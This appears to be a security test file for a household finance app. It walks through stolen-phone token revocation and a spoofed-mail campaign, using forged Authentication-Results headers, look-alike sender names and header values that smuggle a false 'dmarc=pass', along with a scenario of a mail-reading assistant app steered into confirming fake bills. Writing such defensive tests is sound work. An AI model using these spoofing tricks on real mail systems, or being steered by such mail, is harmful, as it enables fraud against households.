"""Security sweep 24 (the eighteenth sweep, the rest of it): five attacker stories, end to end.

test_sweep23_security.py holds what the first run of this round found. This file holds what the stories found after it.

a. A stolen, unlocked iPhone: its token reads and does nothing else, revoking it is immediate, the watch is a row of its
   own; an answer is not kept on the phone's disk; ending a lost phone's session ends its notifications.
b. A month of mail from someone who knows the owner's lender, read daily by a confirm-scoped app: a domain the attacker
   signs, under a lender's name the table does not hold, was "confirmed" and could change the bill; so could a forged
   From signed with someone else's domain. The first from any sender is now the owner's.
c. A compromised model provider: cloud models still got the mail's search and excerpts; "Ollama" at an address on the
   internet got the bodies; the reviewer's packet named accounts; a reply could ask for thousands of calls, and the
   model list had no ceiling.
d. A family member with "everything": where the models are, a mailbox, a connected app, who sees an account and a
   sender's standing were theirs to change, and stayed changed after their access ended.
e. Another container on the box: one POST to /register and an hour's wait broke every later registration; a token of
   "[]" answered the Plaid webhook with a 500.

Attacker domains are under .test; the household is the synthetic one."""

from __future__ import annotations

import asyncio
import base64
import json
from datetime import date, datetime, timedelta, timezone
from email.header import Header
from pathlib import Path
from urllib.parse import parse_qs, urlparse

import httpx
import pytest
from fastapi.testclient import TestClient
from sqlmodel import Session, select

from app import approvals, auth, crypto, notify, webpush
from app.connectors import plaid_webhook
from app.connectors.mail import domains_under_name, handle_message, vouched_domains
from app.db import engine, session_scope
from app.engine.datacheck import TRUSTED, _forget_learned
from app.engine.household import seed
from app.engine.needsyou import plan_many
from app.engine.snapshot import finance_snapshot
from app.llm import reviewer, roles
from app.llm.advisor import BODY_TOOLS, MAX_CALLS_PER_ROUND, advise, off_the_box, system_prompt
from app.llm.providers import Event, MAX_LIST_BYTES, Ollama, OpenAICompatible, Scripted, StreamTooLong
from app.mail.classify import classify
from app.mail.imap import parse_message
from app.mail.trust import brand_of, judge
from app.main import app
from app.models import Account, ApiKey, Approval, AuditEntry, Bill, ExtractedFact, MailAccount, MessageRef, OAuthClient, utcnow
from app.netguard import stays_home
from app.security import APP_CSP
from app.store import set_setting
from tests.test_oauth import REDIRECT, pkce

TODAY = date(2026, 10, 14)
H = {"X-Requested-With": "FinancialAuthority"}
PW = "correct horse battery"
CHAT_PAGE = Path(__file__).resolve().parents[2] / "frontend" / "src" / "pages" / "Chat.tsx"


def passed(domain: str) -> str:
    return f"mx.example.test; dmarc=pass header.from={domain}; dkim=pass header.d={domain}; spf=pass smtp.mailfrom={domain}"


@pytest.fixture(autouse=True)
def fresh_learning():
    _forget_learned()
    yield
    roles.set_override("advisor", None)
    roles.set_override("reviewer", None)


def _everything(owner: TestClient) -> TestClient:
    made = owner.post("/api/v1/people", json={"username": "sam", "display_name": "Sam Example", "role": "everything"})
    assert made.status_code == 200, made.text
    c = TestClient(app)
    c.headers.update(H)
    assert c.post("/api/auth/join", json={"token": made.json()["invite"]["link"].split("#", 1)[1], "password": "maple harbour winter nine"}).status_code == 200
    return c


def _key(scopes: set[str]) -> TestClient:
    with Session(engine) as session:
        _, token = auth.create_key(session, "Example assistant", scopes)
    c = TestClient(app)
    c.headers["Authorization"] = f"Bearer {token}"
    return c


def _oauth(name: str, scopes: list[str] | None = None) -> dict:
    """A client through the server's own sign-in, as the phone and the watch each run it."""
    scopes = scopes or ["read"]
    anon = TestClient(app, follow_redirects=False)
    info = anon.post("/register", json={"client_name": name, "redirect_uris": [REDIRECT], "token_endpoint_auth_method": "none", "grant_types": ["authorization_code", "refresh_token"],
                                        "response_types": ["code"], "scope": " ".join(scopes)}).json()
    verifier, challenge = pkce()
    start = anon.get("/authorize", params={"response_type": "code", "client_id": info["client_id"], "redirect_uri": REDIRECT, "code_challenge": challenge, "code_challenge_method": "S256",
                                           "state": "s", "scope": " ".join(scopes)})
    req = parse_qs(urlparse(start.headers["location"]).query)["req"][0]
    assert anon.post("/oauth/consent", data={"req": req, "decision": "signin", "username": "owner", "password": PW}).status_code == 200
    allowed = anon.post("/oauth/consent", data={"req": req, "decision": "allow", "scope": scopes})
    code = parse_qs(urlparse(allowed.headers["location"]).query)["code"][0]
    tokens = anon.post("/token", data={"grant_type": "authorization_code", "code": code, "code_verifier": verifier, "client_id": info["client_id"], "redirect_uri": REDIRECT}).json()
    return {"client_id": info["client_id"], "access": tokens["access_token"], "refresh": tokens["refresh_token"], "h": {"Authorization": f"Bearer {tokens['access_token']}"}}


# ---- a. the stolen phone ----------------------------------------------------------------------------------------


def test_a_the_phones_token_reads_and_nothing_else_and_revoking_leaves_the_watch_its_own_row(owner: TestClient):
    with Session(engine) as session:
        seed(session)
    phone, watch = _oauth("FinancialAuthority for iPhone and iPad"), _oauth("FinancialAuthority for Apple Watch")
    reader = TestClient(app)
    assert reader.get("/api/v1/glance", headers=phone["h"]).status_code == 200
    assert reader.get("/api/v1/accounts", headers=phone["h"]).status_code == 200  # the read scope reads everything REST shows a read key
    for method, path, body in (("POST", "/api/v1/facts/1/confirm", {}), ("POST", "/api/v1/approvals", {"to": "a@example.test", "subject": "s", "body": "b"}), ("POST", "/api/v1/chat", {"messages": [{"role": "user", "content": "hi"}]}),
                               ("GET", "/api/v1/keys", None), ("POST", "/api/v1/keys", {"name": "x"}), ("GET", "/api/v1/exports", None), ("POST", "/api/v1/people", {"username": "x1"}), ("POST", "/api/v1/privacy/erase", {"phrase": "x", "password": "x"})):
        answer = reader.request(method, path, json=body, headers=phone["h"])
        assert answer.status_code in (401, 403), (path, answer.status_code)
    listed = {c["name"]: c for c in owner.get("/api/v1/oauth/clients").json()["clients"]}
    assert {"FinancialAuthority for iPhone and iPad", "FinancialAuthority for Apple Watch"} <= set(listed) and listed["FinancialAuthority for Apple Watch"]["sessions"] == 1
    assert owner.delete(f"/api/v1/oauth/clients/{phone['client_id']}").json()["tokens_revoked"] == 2
    assert reader.get("/api/v1/glance", headers=phone["h"]).status_code == 401  # at once, a day's access token or not
    assert reader.post("/token", data={"grant_type": "refresh_token", "refresh_token": phone["refresh"], "client_id": phone["client_id"]}).status_code in (400, 401)
    assert reader.get("/api/v1/glance", headers=watch["h"]).status_code == 200  # revoking one row leaves the other: the owner revokes both
    assert owner.delete(f"/api/v1/oauth/clients/{watch['client_id']}").status_code == 200
    assert reader.get("/api/v1/glance", headers=watch["h"]).status_code == 401


def test_a_revoking_ends_an_open_mcp_session_at_its_next_call(live: TestClient, owner: TestClient):
    phone = _oauth("FinancialAuthority for iPhone and iPad")
    headers = {**phone["h"], "Accept": "application/json, text/event-stream", "Content-Type": "application/json"}
    init = live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "t", "version": "1"}}})
    assert init.status_code == 200
    headers["mcp-session-id"] = init.headers["mcp-session-id"]
    live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "method": "notifications/initialized"})
    assert live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 2, "method": "tools/list"}).status_code == 200
    assert owner.delete(f"/api/v1/oauth/clients/{phone['client_id']}").status_code == 200
    assert live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 3, "method": "tools/list"}).status_code == 401


def test_a_an_answer_is_never_kept_by_a_cache(owner: TestClient):
    with Session(engine) as session:
        seed(session)
    token = _key({"read"})
    assert token.get("/api/v1/glance").headers["cache-control"] == "no-store"
    assert owner.get("/api/v1/snapshot").headers["cache-control"] == "no-store"
    assert TestClient(app).get("/api/health").headers["cache-control"] == "no-store"
    assert "no-store" in TestClient(app).get("/oauth/consent").headers["cache-control"]
    # A route that says its own stays as it said.
    roles.set_override("advisor", Scripted([[Event("text", text="Hello.")]]))
    chat = owner.post("/api/v1/chat", json={"messages": [{"role": "user", "content": "hi"}]})
    assert chat.headers["cache-control"] == "no-cache"


def test_a_ending_a_lost_phones_session_ends_its_notifications(owner: TestClient):
    """The owner ends the phone's session from another device; its lock screen went on showing the brief."""
    with Session(engine) as session:
        webpush.ensure_keys(session)
    second = TestClient(app)
    second.headers.update(H)
    assert second.post("/api/auth/login", json={"username": "owner", "password": PW}).status_code == 200
    made = second.post("/api/v1/push/devices", json={"endpoint": "https://push.example.test/lost", "keys": {"p256dh": "k", "auth": "a"}, "label": "Lost phone"})
    assert made.status_code == 200, made.text
    kept = owner.post("/api/v1/push/devices", json={"endpoint": "https://push.example.test/kept", "keys": {"p256dh": "k", "auth": "a"}, "label": "Laptop"})
    assert kept.status_code == 200
    sessions = owner.get("/api/auth/sessions").json()["sessions"]
    other = next(s for s in sessions if not s["this"])
    assert owner.post("/api/auth/sessions/end", json={"session_id": other["id"]}, headers=H).json()["ended"] == 1
    with Session(engine) as session:
        assert [s["label"] for s in webpush.subscriptions(session)] == ["Laptop"]


# ---- b. the mail campaign ---------------------------------------------------------------------------------------


def _mailbox(session: Session) -> MailAccount:
    box = MailAccount(label="Household", kind="imap", host="imap.example.test", username="owner@example.test", password_enc=crypto.encrypt("pw"))
    session.add(box)
    session.commit()
    session.refresh(box)
    return box


_uid = [0]


def _raw(sender: str, name: str, subject: str, body: str, auth_results: str = "", reply_to: str = "", extra: str = "") -> bytes:
    _uid[0] += 1
    head = f"Authentication-Results: {auth_results}\r\n" if auth_results else ""
    head += extra + f"From: {name} <{sender}>\r\nTo: owner@example.test\r\nSubject: {subject}\r\n"
    head += f"Reply-To: {reply_to}\r\n" if reply_to else ""
    head += f"Message-ID: <sweep24-{_uid[0]}@example.test>\r\nDate: Tue, 13 Oct 2026 09:00:00 +0000\r\nContent-Type: text/plain\r\n\r\n"
    return (head + body + "\r\n").encode()


def _land(session: Session, box: MailAccount, raw: bytes) -> tuple[MessageRef, list[ExtractedFact]]:
    _uid[0] += 1
    uid = _uid[0]
    handle_message(session, box, "INBOX", uid, parse_message(raw), TODAY)
    session.commit()
    ref = session.exec(select(MessageRef).where(MessageRef.uid == uid)).one()
    return ref, session.exec(select(ExtractedFact).where(ExtractedFact.message_ref_id == ref.id)).all()


def test_b_a_signature_from_another_domain_says_nothing_about_the_from():
    """A forged From signed with the attacker's own domain was "Confirmed from the lender's domain by the mail server"."""
    forged = "mx.example.test; dkim=pass header.d=attacker.test; spf=pass smtp.mailfrom=attacker.test; dmarc=none header.from=examplelending.test"
    verdict, why = judge("billing@examplelending.test", "Example Lending", forged)
    assert verdict == "warn" and "could not fully confirm" in why
    # OpenDKIM's comment holds a semicolon: the domain after it is still read.
    assert judge("billing@examplelending.test", "Example Lending", "mx.example.test; dkim=pass (2048-bit key; unprotected) header.d=attacker.test; dmarc=none")[0] == "warn"
    # Its own signature, by either property, or a result that names no domain, still counts.
    assert judge("billing@examplelending.test", "Example Lending", "mx.example.test; dkim=pass header.d=examplelending.test; dmarc=none")[0] == "ok"
    assert judge("billing@mail.examplelending.test", "Example Lending", "mx.example.test; dkim=pass header.i=@mail.examplelending.test")[0] == "ok"
    assert judge("billing@examplelending.test", "Example Lending", "mx.example.test; dkim=pass")[0] == "ok"
    # One of two signatures is its own.
    assert judge("billing@examplelending.test", "Example Lending", "mx.example.test; dkim=pass header.d=mailer.test; dkim=pass header.d=examplelending.test")[0] == "ok"


def test_b_a_dmarc_pass_about_another_domain_is_a_forgery():
    """A message with two From lines: the server checked one, the reader took the other."""
    verdict, why = judge("billing@chase.com", "Chase", passed("attacker.test"))
    assert verdict == "crit" and "attacker.test" in why
    assert judge("billing@notify.chase.com", "Chase", "mx.example.test; dmarc=pass header.from=chase.com")[0] == "ok"  # one organisation


def test_b_every_line_the_receiving_server_wrote_is_read():
    """Some servers write one Authentication-Results per method. Only the first was read: a "dkim=pass" for the
    attacker's signature was all the verdict knew, with the "dmarc=fail" one line down."""
    raw = (b"Authentication-Results: mailin1.mail.example.test; dkim=pass (2048-bit key) header.d=attacker.test\r\n"
           b"Authentication-Results: mailin1.mail.example.test; dmarc=fail (p=reject dis=none) header.from=chase.com\r\n"
           b"Authentication-Results: mailin1.mail.example.test; spf=pass smtp.mailfrom=attacker.test\r\n"
           b"Authentication-Results: elsewhere.attacker.test; dmarc=pass header.from=chase.com\r\n"
           b"From: Chase <billing@chase.com>\r\nSubject: Your bill\r\n\r\nAmount due $1.00\r\n")
    parsed = parse_message(raw)
    assert "dmarc=fail" in parsed.auth_results and "elsewhere" not in parsed.auth_results
    assert judge(parsed.sender, parsed.sender_name, parsed.auth_results)[0] == "crit"
    # The attacker's own line below the server's, in the server's name, loses: the first word on a method wins.
    raw = (b"Authentication-Results: mx.example.test; dmarc=fail header.from=chase.com\r\nAuthentication-Results: mx.example.test; dmarc=pass header.from=chase.com\r\n"
           b"From: Chase <billing@chase.com>\r\nSubject: s\r\n\r\nb\r\n")
    parsed = parse_message(raw)
    assert judge(parsed.sender, parsed.sender_name, parsed.auth_results)[0] == "crit"
    # A thousand of them read in no time, and at most a few are kept.
    many = b"".join(b"Authentication-Results: mx.example.test; spf=none\r\n" for _ in range(1000)) + b"From: a@b.test\r\nSubject: s\r\n\r\nb"
    assert parse_message(many).auth_results.count("spf=none") <= 8


def test_b_a_brand_written_any_way_is_the_brand():
    for name, brand in (("CapitalOne", "capital one"), ("CAPITALONE Alerts", "capital one"), ("Capita1 One", "capital one"), ("Capital-One", "capital one"), ("T-Mobile", "t-mobile"), ("TMobile Billing", "t-mobile"),
                        ("WellsFargo", "wells fargo"), ("ATT Billing", "at&t"), ("AT&T", "at&t"), ("Bank of America", "bank of america")):
        assert brand_of(name) == brand, name
    for name in ("Discovery Channel", "Citizens Example", "Applebee Example", "Example Lending"):
        assert brand_of(name) is None, name
    verdict, why = judge("alerts@evil-mail.test", "CapitalOne", passed("evil-mail.test"))
    assert verdict == "crit" and "capitalone.com" in why


def test_b_a_name_the_table_does_not_hold_is_judged_by_what_it_used_before():
    verdict, why = judge("billing@examplelending-servicing.test", "Example Lending", passed("examplelending-servicing.test"), name_domains={"examplelending.test"})
    assert verdict == "warn" and "examplelending.test" in why
    assert judge("billing@examplelending.test", "Example Lending", passed("examplelending.test"), name_domains={"examplelending.test"})[0] == "ok"
    assert judge("billing@new.test", "Example Lending", "", name_domains={"examplelending.test"})[0] == "warn"  # nothing vouches, and the domain is new


def test_b_replies_sent_elsewhere_are_named_for_any_sender():
    assert judge("billing@examplelending.test", "Example Lending", passed("examplelending.test"), reply_to="pay@collect-now.test")[0] == "warn"
    assert judge("billing@examplelending.test", "Example Lending", passed("examplelending.test"), reply_to="help@examplelending.test")[0] == "ok"
    assert judge("x@statefarmservice.com", "State Farm", passed("statefarmservice.com"), reply_to="agent@statefarm.com")[0] == "ok"


def test_b_the_campaign_lands_nothing_from_a_sender_no_person_has_answered_for(owner: TestClient, monkeypatch):
    """The lender is not in the table. A domain the attacker registered and signs writes the lender's name for a month:
    a bill due, a price change, a past due. Read daily by a confirm-scoped app, each changed the bill on the register."""
    pushed: list[str] = []
    monkeypatch.setattr(notify, "send", lambda session, title, body="", **k: pushed.append(title) or {"ok": True})
    attacker = "billing@examplelending-servicing.test"
    with Session(engine) as session:
        session.add(Bill(name="Example Lending", amount=120.0, due_day=20))
        session.commit()
        box = _mailbox(session)
        facts = []
        for subject, body in (("Your payment is due", "Amount due $980.00 on 10/20/2026."), ("A price change to your account", "Your new price is $395.00 starting 10/25/2026."), ("Your payment is past due", "Past due. Amount due $950.00 by 10/18/2026.")):
            ref, made = _land(session, box, _raw(attacker, "Example Lending", subject, body, passed("examplelending-servicing.test")))
            assert ref.trust == "ok" and made, subject  # the domain did sign it; that is all the mail server can say
            facts.append(made[0].id)
    app_client = _key({"read", "confirm"})
    for fid in facts:
        answer = app_client.post(f"/api/v1/facts/{fid}/confirm", json={})
        assert answer.status_code == 403 and "first message from a sender" in answer.json()["detail"], answer.text
    many = app_client.post("/api/v1/needs-you/facts", json={"ids": facts, "action": "confirm"})
    assert many.status_code == 200
    with Session(engine) as session:
        assert session.exec(select(Bill).where(Bill.name == "Example Lending")).one().amount == 120.0
        statuses = {session.get(ExtractedFact, fid).status for fid in facts}
    assert statuses == {"pending"}, "nothing was confirmed, and no older notice was set aside by the app"
    assert not pushed


def test_b_the_first_from_a_sender_is_the_owners_and_then_the_app_may_keep_it_current(owner: TestClient, monkeypatch):
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    genuine = "billing@examplelending.test"
    with Session(engine) as session:
        box = _mailbox(session)
        _, (first, *_) = _land(session, box, _raw(genuine, "Example Lending", "Your bill is due", "Amount due $120.00 on 10/20/2026.", passed("examplelending.test")))
        _, (second, *_) = _land(session, box, _raw(genuine, "Example Lending", "Your bill is due", "Amount due $125.00 on 11/20/2026.", passed("examplelending.test")))
        first_id, second_id = first.id, second.id
    app_client = _key({"read", "confirm"})
    assert app_client.post(f"/api/v1/facts/{second_id}/confirm", json={}).status_code == 403
    assert owner.post(f"/api/v1/facts/{first_id}/confirm", json={}).status_code == 200
    assert app_client.post(f"/api/v1/facts/{second_id}/confirm", json={}).status_code == 200
    with Session(engine) as session:
        assert "examplelending.test" in vouched_domains(session)
        assert session.get(ExtractedFact, second_id).resolved_by.startswith("key:")


def test_b_a_table_brand_on_its_own_domain_and_a_sender_marked_genuine_need_no_first_tap(owner: TestClient, monkeypatch):
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        _, (brand, *_) = _land(session, box, _raw("alerts@capitalone.com", "Capital One", "Your bill is due", "Amount due $40.00 on 10/20/2026.", passed("capitalone.com")))
        _, (marked, *_) = _land(session, box, _raw("bills@example-water.test", "Example Water", "Your bill is due", "Amount due $30.00 on 10/21/2026.", passed("example-water.test")))
        ref = session.get(MessageRef, marked.message_ref_id)
        ref.trust_why = "You marked this sender as genuine."
        session.add(ref)
        session.commit()
        brand_id, marked_id = brand.id, marked.id
    app_client = _key({"read", "confirm"})
    assert app_client.post(f"/api/v1/facts/{brand_id}/confirm", json={}).status_code == 200
    assert app_client.post(f"/api/v1/facts/{marked_id}/confirm", json={}).status_code == 200


def test_b_mail_nothing_vouches_for_is_never_the_apps_to_confirm(owner: TestClient, monkeypatch):
    """No Authentication-Results at all: a From anyone can write. It was confirmable because the verdict was no verdict."""
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        # Even from a domain a person has answered for: this message is not shown to be from it.
        _, (known, *_) = _land(session, box, _raw("billing@examplelending.test", "Example Lending", "Your bill is due", "Amount due $120.00 on 10/20/2026.", passed("examplelending.test")))
        known_id = known.id
    assert owner.post(f"/api/v1/facts/{known_id}/confirm", json={}).status_code == 200
    with Session(engine) as session:
        box = session.exec(select(MailAccount)).first()
        ref, (spoof, *_) = _land(session, box, _raw("billing@examplelending.test", "Example Lending", "Your bill is due", "Amount due $999.00 on 10/22/2026."))
        assert ref.trust == "unknown"
        spoof_id = spoof.id
    app_client = _key({"read", "confirm"})
    assert app_client.post(f"/api/v1/facts/{spoof_id}/confirm", json={}).status_code == 403
    with Session(engine) as session:
        assert session.exec(select(Bill).where(Bill.name == "Example Lending")).one().amount == 120.0


def test_b_the_mcp_tool_answers_the_first_from_a_sender_the_same_way(live: TestClient, monkeypatch):
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        _, (fact, *_) = _land(session, box, _raw("billing@examplelending-servicing.test", "Example Lending", "Your bill is due", "Amount due $980.00 on 10/20/2026.", passed("examplelending-servicing.test")))
        fid = fact.id
        _, token = auth.create_key(session, "Example assistant", {"read", "confirm"})
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json, text/event-stream", "Content-Type": "application/json"}
    init = live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "t", "version": "1"}}})
    sid = init.headers["mcp-session-id"]
    headers["mcp-session-id"] = sid
    live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "method": "notifications/initialized"})
    out = live.post("/mcp", headers=headers, json={"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "facts_confirm", "arguments": {"fact_id": fid}}})
    assert "first message from a sender" in out.text, out.text[:400]
    with Session(engine) as session:
        assert session.get(ExtractedFact, fid).status == "pending"
        assert "facts_confirm_refused" in {a.tool for a in session.exec(select(AuditEntry)).all()}


def test_b_an_earlier_verified_name_on_a_new_domain_warns_through_the_pipeline(owner: TestClient, monkeypatch):
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        real, _ = _land(session, box, _raw("billing@examplelending.test", "Example Lending", "Your bill is due", "Amount due $120.00 on 10/20/2026.", passed("examplelending.test")))
        assert real.trust == "ok"
        fake, _ = _land(session, box, _raw("billing@examplelending-servicing.test", "Example Lending", "Your bill is due", "Amount due $980.00 on 10/20/2026.", passed("examplelending-servicing.test")))
        assert fake.trust == "warn" and "earlier mail under that name came from examplelending.test" in fake.trust_why
        # A look-alike letter in the name reads the same to the owner and is caught all the same.
        drawn_alike = Header("\u0415xample Lending", "utf-8").encode()
        fold, _ = _land(session, box, _raw("billing@examplelending-servicing.test", drawn_alike, "Your bill is due", "Amount due $980.00 on 10/21/2026.", passed("examplelending-servicing.test")))
        assert fold.trust == "warn"
        # Once a person has answered for the second domain, its mail no longer warns.
        assert domains_under_name(session, "Example Lending", "billing@examplelending-servicing.test") == {"examplelending.test"}
        set_setting(session, TRUSTED, {"example lending": ["examplelending-servicing.test"]})
        assert domains_under_name(session, "Example Lending", "billing@examplelending-servicing.test") == set()


def test_b_a_written_message_id_never_takes_a_verified_messages_place(owner: TestClient, monkeypatch):
    """Under a verified message's own Message-ID, a stranger's mail was dropped as seen and the reference moved to its
    number, so opening the verified message showed the stranger's words."""
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})

    def message(sender: str, name: str, auth_results: str) -> bytes:
        return (f"Authentication-Results: {auth_results}\r\nFrom: {name} <{sender}>\r\nTo: owner@example.test\r\nSubject: Your bill is due\r\nMessage-ID: <real@capitalone.com>\r\n"
                "Date: Tue, 13 Oct 2026 09:00:00 +0000\r\nContent-Type: text/plain\r\n\r\nAmount due $120.00 on 10/20/2026.\r\n").encode()

    with Session(engine) as session:
        box = _mailbox(session)
        real = message("alerts@capitalone.com", "Capital One", passed("capitalone.com"))
        handle_message(session, box, "INBOX", 1, parse_message(real), TODAY)
        session.commit()
        # A stranger under the same id, and a forged From that fails the server's check under it: each its own message.
        handle_message(session, box, "INBOX", 2, parse_message(message("x@attacker.test", "Example Sender", passed("attacker.test"))), TODAY)
        handle_message(session, box, "INBOX", 3, parse_message(message("alerts@capitalone.com", "Capital One", "mx.example.test; dmarc=fail header.from=capitalone.com")), TODAY)
        session.commit()
        refs = {r.uid: r for r in session.exec(select(MessageRef)).all()}
        assert sorted(refs) == [1, 2, 3] and refs[1].trust == "ok" and refs[2].sender == "x@attacker.test" and refs[3].trust == "crit"
        # The same message renumbered is still one message, and its reference follows.
        assert handle_message(session, box, "INBOX", 9, parse_message(real), TODAY) == {"seen": True}
        session.commit()
        assert session.get(MessageRef, refs[1].id).uid == 9


def test_b_an_app_may_not_say_a_bill_pays_itself(owner: TestClient, monkeypatch):
    """A bill marked autopay stops being named as one to pay by hand."""
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        _, (fact, *_) = _land(session, box, _raw("alerts@capitalone.com", "Capital One", "Your bill is due", "Amount due $40.00 on 10/20/2026.", passed("capitalone.com")))
        fid = fact.id
    app_client = _key({"read", "confirm"})
    assert app_client.post(f"/api/v1/facts/{fid}/confirm", json={"autopay": True}).status_code == 403
    assert app_client.post(f"/api/v1/facts/{fid}/confirm", json={}).status_code == 200


def test_b_an_app_may_not_set_an_older_notice_aside_or_discard_without_a_word(owner: TestClient, monkeypatch):
    """Confirming a newer notice in bulk discarded the older one even when the newer was refused, so a fake notice and a
    steered app could bury the real one; a discard told nobody."""
    pushed: list[str] = []
    monkeypatch.setattr(notify, "send", lambda session, title, body="", **k: pushed.append(title) or {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        _, (real, *_) = _land(session, box, _raw("billing@example-water.test", "Example Water", "Your bill is due", "Amount due $30.00 on 10/05/2026.", passed("example-water.test")))
        _, (newer, *_) = _land(session, box, _raw("billing@example-water.test", "Example Water", "Your bill is due", "Amount due $30.00 on 11/05/2026.", passed("example-water.test")))
        session.add(Bill(name="Example Water", amount=30.0, due_day=5))
        session.commit()
        real_id, newer_id = real.id, newer.id
    app_client = _key({"read", "confirm"})
    out = app_client.post("/api/v1/needs-you/facts", json={"ids": [real_id, newer_id], "action": "confirm"}).json()
    assert any(row["id"] == real_id and "person" in row["error"] for row in out["failed"]), out
    with Session(engine) as session:
        assert session.get(ExtractedFact, real_id).status == "pending"
    assert app_client.post(f"/api/v1/facts/{newer_id}/reject").status_code == 200
    assert any("discarded an item" in t for t in pushed), pushed
    pushed.clear()
    assert app_client.post("/api/v1/needs-you/facts", json={"ids": [real_id], "action": "reject"}).status_code == 200
    assert any("discarded an item" in t for t in pushed), pushed


def _with_pdf(sender: str, name: str, auth_lines: list[str], attachment: str = "statement.pdf") -> bytes:
    """A bill notice carrying a PDF named like a statement, its Authentication-Results in the order given."""
    from email.message import EmailMessage

    msg = EmailMessage()
    for line in auth_lines:
        msg["Authentication-Results"] = line
    msg["From"] = f"{name} <{sender}>"
    msg["To"] = "owner@example.test"
    msg["Subject"] = "Your bill is due"
    _uid[0] += 1
    msg["Message-ID"] = f"<pdf-{_uid[0]}@example.test>"
    msg.set_content("Amount due $120.00 on 10/20/2026.")
    msg.add_attachment(b"%PDF-1.4 not really", maintype="application", subtype="pdf", filename=attachment)
    return msg.as_bytes()


@pytest.mark.parametrize("line", [
    "mx.example.test; spf=softfail (domain of dmarc=pass@attacker.test) smtp.mailfrom=dmarc=pass@attacker.test; dkim=none; dmarc=none",
    "mx.example.test; spf=softfail smtp.mailfrom=dkim=pass@attacker.test; dmarc=none",
    'mx.example.test; spf=softfail smtp.mailfrom="a;dmarc=pass;b"@attacker.test',
    "mx.example.test; spf=softfail (a (b); dmarc=pass; c) smtp.mailfrom=attacker.test",
])
def test_b_an_envelope_address_is_not_the_servers_verdict(line: str):
    """A forged From, and an envelope sender of "dmarc=pass@attacker.test": the server quotes that address, and the first
    "dmarc=" anywhere in the line was read as its verdict: "Confirmed from chase.com by the mail server"."""
    assert judge("billing@chase.com", "Chase", line)[0] == "warn", line


def test_b_a_pass_the_sender_wrote_under_the_servers_line_is_not_believed():
    """The server said nothing about DMARC. A sender's own header in the server's name, directly below, did."""
    raw = (b"Authentication-Results: mx.example.test; spf=softfail smtp.mailfrom=attacker.test\r\n"
           b"Authentication-Results: mx.example.test; dmarc=pass header.from=chase.com; dkim=pass header.d=chase.com\r\n"
           b"From: Chase <billing@chase.com>\r\nSubject: s\r\n\r\nb\r\n")
    parsed = parse_message(raw)
    assert "pass" not in parsed.auth_results.replace("spf=softfail", "")
    assert judge(parsed.sender, parsed.sender_name, parsed.auth_results)[0] == "warn"
    # The server's own first line still counts, whichever method it states.
    raw = (b"Authentication-Results: mx.example.test; dkim=pass header.d=chase.com\r\nAuthentication-Results: mx.example.test; spf=pass smtp.mailfrom=chase.com\r\n"
           b"From: Chase <billing@chase.com>\r\nSubject: s\r\n\r\nb\r\n")
    parsed = parse_message(raw)
    assert judge(parsed.sender, parsed.sender_name, parsed.auth_results)[0] == "ok"


def test_b_an_attachment_named_like_a_statement_lands_only_from_the_lender_itself(owner: TestClient, monkeypatch):
    """The one thing mail applies with no tap. Named statement.pdf, from a signed domain of the attacker's, from the
    lender's address with a failed check, and with a pass written under the server's line: the reader is never reached."""
    read: list[str] = []

    def reader(session, data, name, today, source):  # noqa: ANN001, ANN202
        read.append(source)

    monkeypatch.setattr("app.engine.borrowing.statement_fact_from_file", reader)
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    with Session(engine) as session:
        box = _mailbox(session)
        for sender, name, lines in (("billing@affirm-statements.test", "Affirm", [passed("affirm-statements.test")]),
                                    ("billing@attacker.test", "Example Lending", [passed("attacker.test")]),
                                    ("notice@affirm.com", "Affirm", ["mx.example.test; dmarc=fail header.from=affirm.com"]),
                                    ("notice@affirm.com", "Affirm", ["mx.example.test; spf=softfail smtp.mailfrom=attacker.test", "mx.example.test; dmarc=pass header.from=affirm.com"])):
            _land(session, box, _with_pdf(sender, name, lines))
        assert read == []
        _land(session, box, _with_pdf("notice@affirm.com", "Affirm", [passed("affirm.com")]))
        assert read == ["mail:notice@affirm.com"]


def test_b_a_month_of_mail_changes_no_figure_without_a_tap(owner: TestClient, monkeypatch):
    """Every shape of the campaign, signed by the attacker's own domain: nothing reaches the registers or safe to spend."""
    monkeypatch.setattr(notify, "send", lambda *a, **k: {"ok": True})
    attacker = "billing@examplelending-servicing.test"
    with Session(engine) as session:
        seed(session)
        session.add(Bill(name="Example Lending", amount=120.0, due_day=20))
        session.commit()
        before = finance_snapshot(session, TODAY)
        bills = len(session.exec(select(Bill)).all())
        box = _mailbox(session)
        for subject, body in (("Your payment is due", "Amount due $980.00 on 10/20/2026."), ("A price change to your account", "Your new price is $395.00 starting 10/25/2026."), ("Your payment is past due", "Past due. Amount due $950.00 by 10/18/2026."),
                              ("Your account is overdrawn", "Overdrawn by $77.00"), ("We received your payment", "We received your payment of $120.00."), ("Your statement is ready", "Your statement is ready. Minimum due $900.00.")):
            for reply_to in ("", "pay@collect-now.test"):
                _land(session, box, _raw(attacker, "Example Lending", subject, body, passed("examplelending-servicing.test"), reply_to))
        after = finance_snapshot(session, TODAY)
        assert after["safe_to_spend"] == before["safe_to_spend"] and after["window"]["total"] == before["window"]["total"] and after["payments"] == before["payments"]
